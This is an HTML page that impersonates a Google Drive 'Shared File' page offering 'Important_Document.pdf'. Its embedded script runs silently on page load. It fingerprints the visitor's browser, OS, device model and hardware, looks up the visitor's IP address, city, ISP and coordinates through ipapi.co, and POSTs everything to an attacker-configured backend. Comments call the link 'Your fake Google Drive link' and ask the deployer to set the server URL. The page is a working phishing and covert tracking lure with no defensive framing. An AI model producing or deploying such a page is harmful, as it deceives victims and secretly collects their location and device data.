<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Drive - Shared File</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><path fill='%234CAF50' d='M41,10H25l-2-2H7C5.9,8,5,8.9,5,10v28c0,1.1,0.9,2,2,2h34c1.1,0,2-0.9,2-2V12C43,10.9,42.1,10,41,10z'/></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: #f1f3f4;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 8px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
            text-align: center;
        }

        .drive-logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
        }

        h1 {
            font-size: 24px;
            color: #202124;
            font-weight: 400;
            margin-bottom: 10px;
        }

        .subtitle {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .file-card {
            background: #f8f9fa;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 30px;
            display: flex;
            align-items: center;
            gap: 16px;
            text-align: left;
        }

        .file-icon {
            width: 48px;
            height: 48px;
            flex-shrink: 0;
        }

        .file-info {
            flex: 1;
        }

        .file-name {
            font-size: 16px;
            color: #202124;
            margin-bottom: 4px;
        }

        .file-details {
            font-size: 12px;
            color: #5f6368;
        }

        .download-btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px 32px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }

        .download-btn:hover {
            background: #1765cc;
        }

        .footer {
            margin-top: 30px;
            color: #5f6368;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <svg class="drive-logo" viewBox="0 0 48 48">
            <path fill="#FFC107" d="M 17 6 L 31 6 L 45 28 L 38 40 L 10 40 L 3 28 Z"/>
            <path fill="#1976D2" d="M 10 40 L 24 16 L 31 6 L 45 28 Z"/>
            <path fill="#4CAF50" d="M 24 16 L 38 40 L 10 40 Z"/>
        </svg>

        <h1>Shared File</h1>
        <p class="subtitle">Someone shared a file with you</p>

        <div class="file-card">
            <svg class="file-icon" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M14,2H6C4.9,2,4,2.9,4,4v16c0,1.1,0.9,2,2,2h12c1.1,0,2-0.9,2-2V8L14,2z M6,20V4h7v5h5v11H6z"/>
                <path fill="#4285F4" d="M8,15h8v2H8V15z M8,11h8v2H8V11z M8,7h5v2H8V7z"/>
            </svg>
            <div class="file-info">
                <div class="file-name">Important_Document.pdf</div>
                <div class="file-details">2.4 MB â€¢ PDF</div>
            </div>
        </div>

        <button class="download-btn" onclick="openDriveLink()">Open in Google Drive</button>

        <div class="footer">
            This file is shared from Google Drive
        </div>
    </div>

    <script>
        // âš™ï¸ CONFIGURATION
        const BACKEND_URL = 'http://localhost:3000'; // UPDATE THIS!
        const DRIVE_LINK = 'https://drive.google.com/file/d/1abc123example/view'; // Your fake Google Drive link

        // ðŸ” DETAILED DEVICE DETECTION
        function getDetailedDeviceInfo() {
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            
            let browser = 'Unknown', browserVersion = 'Unknown';
            if (ua.match(/Firefox\/([0-9.]+)/)) {
                browser = 'Firefox';
                browserVersion = ua.match(/Firefox\/([0-9.]+)/)[1];
            } else if (ua.match(/Chrome\/([0-9.]+)/)) {
                browser = 'Chrome';
                browserVersion = ua.match(/Chrome\/([0-9.]+)/)[1];
            } else if (ua.match(/Safari\/([0-9.]+)/) && !ua.includes('Chrome')) {
                browser = 'Safari';
                browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
            } else if (ua.match(/Edg\/([0-9.]+)/)) {
                browser = 'Edge';
                browserVersion = ua.match(/Edg\/([0-9.]+)/)[1];
            }

            let os = 'Unknown', osVersion = 'Unknown';
            if (ua.includes('Windows NT 10.0')) {
                os = 'Windows'; osVersion = '10 or 11';
            } else if (ua.includes('Mac OS X')) {
                os = 'MacOS';
                const match = ua.match(/Mac OS X ([0-9_]+)/);
                if (match) osVersion = match[1].replace(/_/g, '.');
            } else if (ua.includes('Android')) {
                os = 'Android';
                const match = ua.match(/Android ([0-9.]+)/);
                if (match) osVersion = match[1];
            } else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) {
                os = 'iOS';
                const match = ua.match(/OS ([0-9_]+)/);
                if (match) osVersion = match[1].replace(/_/g, '.');
            }

            let deviceType = 'Desktop', deviceModel = 'Unknown', deviceManufacturer = 'Unknown';
            
            if (/mobile/i.test(ua)) {
                deviceType = 'Mobile';
                if (ua.includes('iPhone')) {
                    deviceManufacturer = 'Apple';
                    deviceModel = 'iPhone';
                } else if (ua.includes('SM-')) {
                    deviceManufacturer = 'Samsung';
                    const match = ua.match(/SM-([A-Z0-9]+)/);
                    deviceModel = match ? 'Samsung ' + match[1] : 'Samsung Galaxy';
                } else if (ua.includes('Redmi')) {
                    deviceManufacturer = 'Xiaomi';
                    const match = ua.match(/Redmi ([A-Za-z0-9 ]+)/);
                    deviceModel = match ? 'Redmi ' + match[1].split(';')[0] : 'Redmi';
                } else if (ua.includes('Mi ')) {
                    deviceManufacturer = 'Xiaomi';
                    const match = ua.match(/Mi ([A-Za-z0-9 ]+)/);
                    deviceModel = match ? 'Mi ' + match[1].split(';')[0] : 'Mi';
                } else if (ua.includes('OnePlus')) {
                    deviceManufacturer = 'OnePlus';
                    const match = ua.match(/OnePlus ([A-Z0-9]+)/i);
                    deviceModel = match ? 'OnePlus ' + match[1] : 'OnePlus';
                } else if (ua.includes('OPPO')) {
                    deviceManufacturer = 'Oppo';
                    deviceModel = 'Oppo';
                } else if (ua.includes('vivo')) {
                    deviceManufacturer = 'Vivo';
                    deviceModel = 'Vivo';
                } else if (ua.includes('RMX')) {
                    deviceManufacturer = 'Realme';
                    const match = ua.match(/RMX([0-9]+)/);
                    deviceModel = match ? 'Realme RMX' + match[1] : 'Realme';
                } else if (ua.includes('Pixel')) {
                    deviceManufacturer = 'Google';
                    deviceModel = 'Pixel';
                }
            } else if (/tablet|ipad/i.test(ua)) {
                deviceType = 'Tablet';
                if (ua.includes('iPad')) {
                    deviceManufacturer = 'Apple';
                    deviceModel = 'iPad';
                }
            }

            const screenInfo = {
                width: window.screen.width,
                height: window.screen.height,
                orientation: window.screen.orientation?.type || 'Unknown'
            };

            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

            return {
                browser, browserVersion, os, osVersion,
                deviceType, deviceModel, deviceManufacturer,
                screenResolution: `${screenInfo.width}x${screenInfo.height}`,
                viewportSize: `${window.innerWidth}x${window.innerHeight}`,
                screenOrientation: screenInfo.orientation,
                cpuCores: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                platform: platform,
                touchPoints: navigator.maxTouchPoints || 0,
                isTouchDevice: navigator.maxTouchPoints > 0,
                connectionType: connection?.effectiveType || 'Unknown',
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                userAgent: ua,
                timestamp: new Date().toISOString()
            };
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    countryCode: data.country_code || 'Unknown',
                    isp: data.org || 'Unknown',
                    timezone: data.timezone || 'Unknown',
                    latitude: data.latitude || null,
                    longitude: data.longitude || null
                };
            } catch (error) {
                return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
            }
        }

        async function trackVisitor() {
            const deviceInfo = getDetailedDeviceInfo();
            const ipInfo = await getIPInfo();

            const trackingData = {
                ...deviceInfo,
                ...ipInfo,
                page: window.location.href,
                referrer: document.referrer || 'Direct'
            };

            try {
                await fetch(`${BACKEND_URL}/api/track`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(trackingData)
                });
            } catch (error) {
                console.log('Tracking error:', error);
            }
        }

        function openDriveLink() {
            window.open(DRIVE_LINK, '_blank');
        }

        // Track on page load (silent)
        window.onload = trackVisitor;
    </script>
</body>
</html>
